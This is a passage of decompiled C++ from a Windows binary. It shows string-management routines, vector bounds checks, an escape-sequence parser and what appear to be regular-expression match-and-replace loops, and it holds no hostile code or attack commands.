    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (local_24,pcVar2,pcVar1);
    local_14 = 1;
    pbVar4 = local_24;
    local_8 = 1;
  }
  *param_1 = *pbVar4;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (param_1,false);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
            (param_1,pbVar4,0,*(uint *)npos_exref);
  local_8 = 1;
  uVar3 = local_14 | 4;
  if ((local_14 & 2) != 0) {
    local_14 = local_14 & 0xfffffffd | 4;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_34,true);
    uVar3 = local_14;
  }
  local_14 = uVar3;
  local_8 = 0;
  if ((local_14 & 1) != 0) {
    local_14 = local_14 & 0xfffffffe;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_24,true);
  }
  ExceptionList = local_10;
  return param_1;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall FUN_004023ae(void *this,undefined *param_1)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this_00;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415838;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  *(undefined *)((int)this + 4) = *param_1;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 0xc) = 0;
  *(undefined4 *)((int)this + 0x10) = 0;
  *(undefined **)this = &DAT_00417664;
  this_00 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
            ((int)this + 0x18);
  local_8 = 0;
  *this_00 = param_1._3_1_;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (this_00,false);
  *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
   ((int)this + 0x28) = this_00;
  *(undefined **)this = &DAT_0041766c;
  ExceptionList = local_10;
  return (undefined4 *)this;
}



void __fastcall FUN_00402408(int param_1)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar1;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this;
  
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            (param_1 + 8);
  for (this = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
               (param_1 + 4); this != pbVar1; this = this + 0x10) {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (this,true);
  }
  operator_delete(*(void **)(param_1 + 4));
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  return;
}



undefined4 * __thiscall FUN_0040243e(void *this,byte param_1)

{
  FUN_0040223b((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_0040245a(void *this,byte param_1)

{
  FUN_00402269((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00402476(void *this,byte param_1)

{
  FUN_004021a6((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_004024aa(void **param_1)

{
  FUN_00402f79((int)*param_1);
  operator_delete(*param_1);
  *param_1 = (void *)0x0;
  return;
}



void __fastcall FUN_004024c1(int *param_1)

{
  int *local_4;
  
  local_4 = param_1;
  FUN_00402647(param_1,&local_4,*(int ***)(int **)param_1[1],(int **)param_1[1]);
  operator_delete((void *)param_1[1]);
  param_1[1] = 0;
  param_1[2] = 0;
  return;
}



void __thiscall FUN_004024ec(void *this,undefined *param_1)

{
  *(undefined *)this = *param_1;
  *(undefined4 *)((int)this + 4) = 0;
  *(undefined4 *)((int)this + 8) = 0;
  *(undefined4 *)((int)this + 0xc) = 0;
  return;
}



int __thiscall FUN_00402504(void *this,uint param_1)

{
  if ((*(int *)((int)this + 4) == 0) ||
     ((uint)((*(int *)((int)this + 8) - *(int *)((int)this + 4)) / 0x1a) <= param_1)) {
    FUN_0040267f();
  }
  return param_1 * 0x1a + *(int *)((int)this + 4);
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall
FUN_00402534(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            undefined4 param_2,undefined4 param_3)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_24 [16];
  void *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415855;
  local_10 = ExceptionList;
  local_24[0] = param_1._3_1_;
  ExceptionList = &local_10;
  local_14 = this;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_24,false);
  local_8 = 0;
  FUN_004026dd(this,param_2,param_3,param_1,local_24);
  local_8 = CONCAT31(local_8._1_3_,2);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_24,true);
  *(undefined **)this = &DAT_00417670;
  FUN_004065f1(this,*(uint *)((int)this + 0x13));
  ExceptionList = local_10;
  return (undefined4 *)this;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall
FUN_004025a0(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_2,
            undefined4 param_3,undefined4 param_4)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415868;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_004026dd(this,param_3,param_4,param_1,param_2);
  local_8 = 0;
  *(undefined **)this = &DAT_00417670;
  FUN_004065f1(this,*(uint *)((int)this + 0x13));
  if ((*(byte *)((int)this + 0x14) & 1) != 0) {
    FUN_0040291e(*(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                  ((int)this + 0x2f),'\x01');
  }
  FUN_004061be(this,*(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                      **)((int)this + 0x2f),(undefined *)((int)this + 8),(void *)((int)this + 0x33))
  ;
  ExceptionList = local_10;
  return (undefined4 *)this;
}



void __fastcall FUN_0040260b(char *param_1)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this;
  
  if ((*param_1 != '\0') &&
     (this = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              (param_1 + 4),
     this != (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0)) {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (this,true);
    operator_delete(this);
  }
  return;
}



undefined4 * __thiscall FUN_0040262b(void *this,byte param_1)

{
  thunk_FUN_00402269((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



void __thiscall FUN_00402647(void *this,int **param_1,int **param_2,int **param_3)

{
  int **ppiVar1;
  
  while (param_2 != param_3) {
    ppiVar1 = (int **)*param_2;
    *param_2[1] = (int)*param_2;
    (*param_2)[1] = (int)param_2[1];
    operator_delete(param_2);
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + -1;
    param_2 = ppiVar1;
  }
  *param_1 = (int *)param_2;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void FUN_0040267f(void)

{
  size_t sVar1;
  code *local_40 [7];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_24 [20];
  void *pvStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_0041587d;
  pvStack_10 = ExceptionList;
  ExceptionList = &pvStack_10;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
            (local_24,false);
  sVar1 = strlen(s_invalid_vector<T>_subscript_0041c1e0);
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
            (local_24,s_invalid_vector<T>_subscript_0041c1e0,sVar1);
  local_8 = 0;
  std::logic_error::logic_error((logic_error *)local_40,local_24);
  local_40[0] = _vftable__exref;
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_40,(ThrowInfo *)&DAT_004194d0);
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

undefined4 * __thiscall
FUN_004026dd(void *this,undefined4 param_1,undefined4 param_2,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_3,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_4)

{
  int iVar1;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar2;
  undefined4 uVar3;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar4;
  byte *pbVar5;
  undefined4 uStack_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_004158c8;
  local_10 = ExceptionList;
  pbVar5 = (byte *)((int)&uStack_14 + 3);
  ExceptionList = &local_10;
  uStack_14 = this;
  iVar1 = FUN_004043cd();
  FUN_00402817((void *)((int)this + 4),iVar1,pbVar5);
  *(undefined4 *)((int)this + 0x13) = param_1;
  *(undefined4 *)((int)this + 0x17) = param_2;
  *(undefined4 *)((int)this + 0x1b) = 0xffffffff;
  local_8 = 0;
  *(undefined *)((int)this + 8) = 0;
  *(undefined *)((int)this + 9) = 1;
  *(undefined *)((int)this + 10) = 1;
  *(undefined4 *)((int)this + 0xb) = 0;
  *(undefined4 *)((int)this + 0xf) = 0;
  *(undefined4 *)((int)this + 0x1f) = 0xffffffff;
  pbVar2 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
           operator_new(0x10);
  local_8._0_1_ = 1;
  if (pbVar2 == (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0)
  {
    pbVar2 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0;
  }
  else {
    *pbVar2 = *param_3;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (pbVar2,false);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (pbVar2,param_3,0,*(uint *)npos_exref);
  }
  *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
   ((int)this + 0x27) = pbVar2;
  *(bool *)((int)this + 0x23) =
       pbVar2 != (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0
  ;
  local_8._0_1_ = 2;
  pbVar2 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
           operator_new(0x10);
  local_8._0_1_ = 3;
  if (pbVar2 == (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0)
  {
    pbVar4 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0;
  }
  else {
    *pbVar2 = *param_4;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (pbVar2,false);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (pbVar2,param_4,0,*(uint *)npos_exref);
    pbVar4 = pbVar2;
  }
  *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
   ((int)this + 0x2f) = pbVar4;
  *(bool *)((int)this + 0x2b) =
       pbVar4 != (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0
  ;
  param_3._3_1_ = (undefined)((uint)pbVar2 >> 0x18);
  local_8._0_1_ = 4;
  *(undefined *)((int)this + 0x33) = param_3._3_1_;
  uVar3 = FUN_00402864((void **)0x0,(void **)0x0);
  *(undefined4 *)((int)this + 0x37) = uVar3;
  *(undefined4 *)((int)this + 0x3b) = 0;
  *(undefined4 *)((int)this + 0x3f) = 0;
  local_8 = CONCAT31(local_8._1_3_,5);
  *(undefined *)((int)this + 0x43) = param_3._3_1_;
  uVar3 = FUN_00402888((void **)0x0,(void **)0x0);
  *(undefined4 *)((int)this + 0x47) = uVar3;
  *(undefined4 *)((int)this + 0x4b) = 0;
  *(undefined4 *)((int)this + 0x4f) = 0;
  *(undefined **)this = &DAT_00417668;
  ExceptionList = local_10;
  return (undefined4 *)this;
}



uint ** __thiscall FUN_00402817(void *this,int param_1,byte *param_2)

{
  byte bVar1;
  uint *puVar2;
  uint local_10;
  uint uStack_c;
  undefined uStack_8;
  
  *(undefined4 *)this = 0;
  bVar1 = *param_2;
  puVar2 = (uint *)operator_new(9);
  *(uint **)this = puVar2;
  local_10 = (uint)bVar1;
  uStack_c = param_1 << 8;
  uStack_8 = (undefined)((uint)param_1 >> 0x18);
  if (puVar2 != (uint *)0x0) {
    *puVar2 = local_10;
    puVar2[1] = uStack_c;
    *(undefined *)(puVar2 + 2) = uStack_8;
  }
  FUN_00402f79((int)&local_10);
  return (uint **)this;
}



void FUN_00402864(void **param_1,void **param_2)

{
  void **ppvVar1;
  
  ppvVar1 = (void **)operator_new(0x14);
  if (param_1 == (void **)0x0) {
    param_1 = ppvVar1;
  }
  *ppvVar1 = param_1;
  if (param_2 == (void **)0x0) {
    param_2 = ppvVar1;
  }
  ppvVar1[1] = param_2;
  return;
}



void FUN_00402888(void **param_1,void **param_2)

{
  void **ppvVar1;
  
  ppvVar1 = (void **)operator_new(0xc);
  if (param_1 == (void **)0x0) {
    param_1 = ppvVar1;
  }
  *ppvVar1 = param_1;
  if (param_2 == (void **)0x0) {
    param_2 = ppvVar1;
  }
  ppvVar1[1] = param_2;
  return;
}



void __thiscall
FUN_004028ac(void *this,int param_1,void *param_2,int param_3,int param_4,int param_5)

{
  int iVar1;
  char *pcVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((param_5 == -1) || (*(uint *)(param_1 + 8) <= (uint)(param_4 + param_5))) {
    pcVar2 = (char *)(-(uint)(iVar1 != 0) & *(int *)(param_1 + 8) + iVar1);
  }
  else {
    pcVar2 = (char *)(iVar1 + param_4 + param_5);
  }
  FUN_00403af2((int)this,param_2,(char *)(iVar1 + param_4),pcVar2,param_3,'\0');
  return;
}



void __cdecl FUN_004028fb(void *param_1)

{
  uint local_c;
  undefined4 local_8;
  
  local_c = 0;
  local_8 = 0;
  FUN_00402c9d(param_1,(char *)&local_c);
  FUN_0040260b((char *)&local_c);
  return;
}



void __cdecl
FUN_0040291e(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            char param_2)

{
  uint uVar1;
  uint uVar2;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this;
  code cVar3;
  byte bVar4;
  uint uVar5;
  code *pcVar6;
  undefined4 uVar8;
  uint uVar9;
  int iVar7;
  
  this = param_1;
  uVar2 = *(uint *)npos_exref;
  if (*(int *)(param_1 + 8) != 0) {
    param_1 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
              CONCAT13(0x5c,param_1._0_3_);
    uVar5 = std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::find
                      (this,(char *)((int)&param_1 + 3),0,1);
    pcVar6 = _C_exref;
    while ((_C_exref = pcVar6, uVar2 != uVar5 && (*(uint *)(this + 8) - 1 != uVar5))) {
      uVar1 = uVar5 + 1;
      if ((uVar1 <= *(uint *)(this + 8)) && (*(int *)(this + 4) != 0)) {
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                  (this);
        pcVar6 = (code *)(*(int *)(this + 4) + uVar1);
      }
      cVar3 = *pcVar6;
      uVar9 = uVar1;
      if ((char)cVar3 < 'g') {
        if (cVar3 == (code)0x66) {
          bVar4 = 0xc;
          goto LAB_00402c67;
        }
        if ((char)cVar3 < '0') {
LAB_00402bb1:
          if (param_2 == '\0') {
LAB_00402bbe:
            std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::erase
                      (this,uVar5,1);
            uVar9 = uVar5;
          }
        }
        else if ((char)cVar3 < '8') {
          uVar9 = uVar5;
          if (param_2 == '\0') {
            uVar9 = uVar5 + 2;
            pcVar6 = _C_exref;
            if ((uVar1 <= *(uint *)(this + 8)) && (*(int *)(this + 4) != 0)) {
              std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
              _Freeze(this);
              pcVar6 = (code *)(*(int *)(this + 4) + uVar1);
            }
            bVar4 = (char)*pcVar6 - 0x30;
            for (; (uVar9 - uVar5 < 4 && (uVar9 < *(uint *)(this + 8))); uVar9 = uVar9 + 1) {
              pcVar6 = _C_exref;
              if (*(int *)(this + 4) != 0) {
                std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
                _Freeze(this);
                pcVar6 = (code *)(*(int *)(this + 4) + uVar9);
              }
              if ((char)*pcVar6 < '0') break;
              pcVar6 = _C_exref;
              if ((uVar9 <= *(uint *)(this + 8)) && (*(int *)(this + 4) != 0)) {
                std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
                _Freeze(this);
                pcVar6 = (code *)(*(int *)(this + 4) + uVar9);
              }
              if ('7' < (char)*pcVar6) break;
              pcVar6 = _C_exref;
              if ((uVar9 <= *(uint *)(this + 8)) && (*(int *)(this + 4) != 0)) {
                std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
                _Freeze(this);
                pcVar6 = (code *)(*(int *)(this + 4) + uVar9);
              }
              bVar4 = (bVar4 - 6) * '\b' + (char)*pcVar6;
            }
LAB_00402c4f:
            uVar9 = uVar9 - uVar5;
            goto LAB_00402c6b;
          }
        }
        else if (cVar3 == (code)0x5c) {
          if (param_2 == '\0') goto LAB_00402bbe;
          if (uVar5 + 3 < *(uint *)(this + 8)) {
            pcVar6 = _C_exref;
            if ((uVar5 + 2 <= *(uint *)(this + 8)) && (*(int *)(this + 4) != 0)) {
              std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
              _Freeze(this);
              pcVar6 = (code *)(*(int *)(this + 4) + uVar5 + 2);
            }
            if (*pcVar6 == (code)0x5c) {
              pcVar6 = _C_exref;
              if ((uVar5 + 3 <= *(uint *)(this + 8)) && (*(int *)(this + 4) != 0)) {
                std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
                _Freeze(this);
                pcVar6 = (code *)(*(int *)(this + 4) + uVar5 + 3);
              }
              if (*pcVar6 == (code)0x5c) {
                std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
                erase(this,uVar5,2);
              }
            }
          }
        }
        else {
          if (cVar3 == (code)0x61) {
            bVar4 = 7;
            goto LAB_00402c67;
          }
          if (cVar3 == (code)0x62) {
            if (param_2 == '\0') {
              bVar4 = 8;
              goto LAB_00402c67;
            }
          }
          else {
            if (cVar3 != (code)0x63) {
              if (cVar3 != (code)0x65) goto LAB_00402bb1;
              bVar4 = 0x1b;
              goto LAB_00402c67;
            }
            uVar9 = uVar5;
            if ((param_2 == '\0') && (uVar5 + 2 < *(uint *)(this + 8))) {
              pcVar6 = _C_exref;
              if (*(int *)(this + 4) != 0) {
                std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
                _Freeze(this);
                pcVar6 = (code *)(*(int *)(this + 4) + uVar5 + 2);
              }
              cVar3 = *pcVar6;
              if (('`' < (char)cVar3) && ((char)cVar3 < '{')) {
                iVar7 = toupper((int)(char)cVar3);
                cVar3 = SUB41(iVar7,0);
              }
              bVar4 = (byte)cVar3 ^ 0x40;
              uVar9 = 3;
              goto LAB_00402c6b;
            }
          }
        }
      }
      else {
        if (cVar3 == (code)0x6e) {
          bVar4 = 10;
LAB_00402c67:
          uVar9 = 2;
        }
        else {
          if (cVar3 == (code)0x72) {
            bVar4 = 0xd;
            goto LAB_00402c67;
          }
          if (cVar3 == (code)0x74) {
            bVar4 = 9;
          }
          else {
            if (cVar3 != (code)0x76) {
              if (cVar3 == (code)0x78) {
                uVar9 = uVar5;
                if (param_2 == '\0') {
                  bVar4 = 0;
                  for (uVar9 = uVar5 + 2; (uVar9 - uVar5 < 4 && (uVar9 < *(uint *)(this + 8)));
                      uVar9 = uVar9 + 1) {
                    pcVar6 = _C_exref;
                    if (*(int *)(this + 4) != 0) {
                      std::
                      basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
                      _Freeze(this);
                      pcVar6 = (code *)(*(int *)(this + 4) + uVar9);
                    }
                    uVar8 = FUN_00402f9a((char)*pcVar6);
                    if ((char)uVar8 == '\0') break;
                    pcVar6 = _C_exref;
                    if ((uVar9 <= *(uint *)(this + 8)) && (*(int *)(this + 4) != 0)) {
                      std::
                      basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
                      _Freeze(this);
                      pcVar6 = (code *)(*(int *)(this + 4) + uVar9);
                    }
                    iVar7 = FUN_00402fbd((char)*pcVar6);
                    bVar4 = (char)iVar7 + bVar4 * '\x10';
                  }
                  goto LAB_00402c4f;
                }
                goto LAB_00402c74;
              }
              goto LAB_00402bb1;
            }
            bVar4 = 0xb;
          }
          uVar9 = 2;
        }
LAB_00402c6b:
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::replace
                  (this,uVar5,uVar9,1,bVar4);
        uVar9 = uVar5;
      }
LAB_00402c74:
      if (*(uint *)(this + 8) <= uVar9 + 1) {
        return;
      }
      param_1 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                CONCAT13(0x5c,param_1._0_3_);
      uVar5 = std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
              find(this,(char *)((int)&param_1 + 3),uVar9 + 1,1);
      pcVar6 = _C_exref;
    }
  }
  return;
}



char * __thiscall FUN_00402c9d(void *this,char *param_1)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this_00;
  
  if ((char *)this != param_1) {
    this_00 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
               ((int)this + 4);
    if (this_00 ==
        *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
         (param_1 + 4)) {
      if (*param_1 != '\0') {
        *(undefined *)this = 1;
      }
    }
    else {
                    // WARNING: Load size is inaccurate
      if ((*this != '\0') &&
         (this_00 !=
          (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0)) {
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                  (this_00,true);
        operator_delete(this_00);
      }
      *(char *)this = *param_1;
    }
    *param_1 = '\0';
    *(undefined4 *)((int)this + 4) = *(undefined4 *)(param_1 + 4);
  }
  return (char *)this;
}



void __cdecl FUN_00402ceb(int param_1,int param_2,char *param_3)

{
  size_t sVar1;
  
  if ((*(byte *)(param_1 + 0x13) & 0x10) == 0) {
    FUN_004035be(param_1,param_2,(int)param_3,0,'\x01');
  }
  else {
    sVar1 = strlen(param_3);
    FUN_004035be(param_1,param_2,(int)param_3,param_3 + sVar1,'\0');
  }
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

int __cdecl
FUN_00402d2d(int param_1,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_2,
            void *param_3,int param_4,undefined *param_5)

{
  byte bVar1;
  void *pvVar2;
  char cVar3;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar4;
  undefined **ppuVar5;
  int iVar6;
  int *local_5c;
  undefined *local_58;
  int local_54;
  undefined4 local_50;
  undefined4 local_4c;
  int local_48;
  int local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined local_38;
  undefined local_37;
  undefined local_34 [4];
  undefined4 local_30;
  undefined4 *local_2c;
  undefined4 local_28;
  int *local_24;
  uint local_20;
  int local_1c;
  int local_18;
  undefined *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  pvVar2 = param_3;
  local_8 = 0xffffffff;
  puStack_c = &LAB_004158dc;
  local_10 = ExceptionList;
  if ((*(char *)(param_1 + 8) != '\0') ||
     (pbVar4 = param_2, ExceptionList = &local_10, (*(byte *)(param_1 + 0x13) & 0x20) == 0)) {
    ExceptionList = &local_10;
    pbVar4 = std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
             assign((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                    ((int)param_3 + 0x18),param_2,0,*(uint *)npos_exref);
  }
  *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
   ((int)pvVar2 + 0x28) = pbVar4;
  local_54 = *(int *)(pbVar4 + 4);
  *(int *)((int)pvVar2 + 0x14) = local_54;
  local_14 = *(undefined **)(pbVar4 + 8);
  local_18 = 0;
  if (param_5 != (undefined *)0xffffffff) {
    param_3 = param_5 + param_4;
    ppuVar5 = (undefined **)&param_3;
    if (*(undefined **)(pbVar4 + 8) <= param_3) {
      ppuVar5 = &local_14;
    }
    local_14 = *ppuVar5;
  }
  local_48 = param_4 + local_54;
  local_58 = local_14 + local_54;
  local_5c = (int *)0x0;
  local_50 = 0;
  local_4c = 0;
  local_40 = 0;
  local_3c = 0;
  local_38 = false;
  local_37 = 0;
  local_44 = local_48;
  if ((*(uint *)(param_1 + 0x13) & 2) == 0) {
    param_5 = (undefined *)((int)pvVar2 + 4);
    cVar3 = FUN_004036f8(param_1,&local_5c,param_5,'\0');
    if (cVar3 != '\0') {
      local_18 = 1;
      FUN_00403810(param_2,pvVar2,param_1,*local_5c - *(int *)((int)pvVar2 + 0x14),
                   local_5c[1] - *local_5c);
      *(undefined4 *)((int)pvVar2 + 0x14) = *(undefined4 *)(*(int *)((int)pvVar2 + 0x28) + 4);
    }
  }
  else {
    local_30 = 0;
    bVar1 = (byte)*(uint *)(param_1 + 0x13);
    local_2c = (undefined4 *)0x0;
    param_5 = (undefined *)((int)pvVar2 + 4);
    param_3 = (void *)CONCAT13((bVar1 & 0x80) == 0x80,param_3._0_3_);
    local_34[0] = *param_5;
    local_28 = 0;
    local_8 = 0;
    local_1c = 0;
    while (cVar3 = FUN_004036f8(param_1,&local_5c,param_5,'\0'), cVar3 != '\0') {
      local_18 = local_18 + 1;
      local_24 = local_5c;
      local_20 = local_5c[1] - *local_5c;
      param_4 = *local_5c - *(int *)((int)pvVar2 + 0x14);
      iVar6 = FUN_00403810(param_2,pvVar2,param_1,param_4 + local_1c,local_20);
      if ((*(char *)(param_1 + 8) == '\0') && ((*(byte *)(param_1 + 0x13) & 0x20) != 0)) {
        param_4 = param_4 + iVar6;
        local_14 = local_14 + (iVar6 - local_20);
        *(undefined4 *)((int)pvVar2 + 0x14) = *(undefined4 *)(*(int *)((int)pvVar2 + 0x28) + 4);
      }
      else {
        param_4 = param_4 + local_20;
        local_1c = local_1c + (iVar6 - local_20);
        if ((bVar1 & 0x40) == 0x40) {
          FUN_00403046(local_34,local_24);
        }
        else if (param_3._3_1_ == '\0') {
          FUN_004032e8(local_34,(int)param_5);
        }
        else {
          FUN_00403057(local_34,local_2c,*(undefined4 **)((int)pvVar2 + 8),
                       *(undefined4 **)((int)pvVar2 + 0xc));
        }
      }
      local_38 = local_20 == 0;
      local_44 = param_4 + *(int *)((int)pvVar2 + 0x14);
      local_58 = local_14 + *(int *)((int)pvVar2 + 0x14);
    }
    if ((*(char *)(param_1 + 8) == '\0') && ((*(byte *)(param_1 + 0x13) & 0x20) != 0)) {
      if (*(char *)(*(int *)((int)pvVar2 + 8) + 8) == '\0') {
        FUN_004032dc(param_5);
      }
    }
    else {
      FUN_004032e8(param_5,(int)local_34);
    }
    local_8 = 0xffffffff;
    FUN_00402249((int)local_34);
  }
  if (((byte)*(undefined4 *)(param_1 + 0x13) & 0x20) == 0x20) {
    FUN_004032dc(param_5);
  }
  ExceptionList = local_10;
  return local_18;
}



void __fastcall FUN_00402f79(int param_1)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 1);
  while (iVar1 != 0) {
    iVar1 = *(int *)((int)*(void **)(param_1 + 1) + 8);
    operator_delete(*(void **)(param_1 + 1));
    *(int *)(param_1 + 1) = iVar1;
  }
  return;
}



undefined4 __cdecl FUN_00402f9a(char param_1)

{
  if ((((param_1 < '0') || ('9' < param_1)) && ((param_1 < 'a' || ('f' < param_1)))) &&
     ((param_1 < 'A' || ('F' < param_1)))) {
    return 0;
  }
  return 1;
}



int __cdecl FUN_00402fbd(char param_1)

{
  if (('`' < param_1) && (param_1 < 'g')) {
    return param_1 + -0x57;
  }
  if (('@' < param_1) && (param_1 < 'G')) {
    return param_1 + -0x37;
  }
  return param_1 + -0x30;
}



void FUN_00402ff0(void)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 local_20 [2];
  undefined local_18;
  undefined4 local_17;
  undefined4 local_13;
  undefined local_f;
  undefined4 local_e;
  undefined4 local_a;
  
  if ((DAT_0041cba2 & 1) == 0) {
    DAT_0041cba2 = DAT_0041cba2 | 1;
    local_18 = 0;
    local_13 = 0;
    local_f = 0;
    local_20[0] = DAT_00417674;
    local_20[1] = DAT_00417674;
    local_17 = DAT_00417674;
    local_e = DAT_00417674;
    local_a = DAT_00417674;
    puVar2 = local_20;
    puVar3 = (undefined4 *)&DAT_0041cbc0;
    for (iVar1 = 6; iVar1 != 0; iVar1 = iVar1 + -1) {
      *puVar3 = *puVar2;
      puVar2 = puVar2 + 1;
      puVar3 = puVar3 + 1;
    }
    *(undefined2 *)puVar3 = *(undefined2 *)puVar2;
  }
  return;
}



void __thiscall FUN_00403046(void *this,undefined4 *param_1)

{
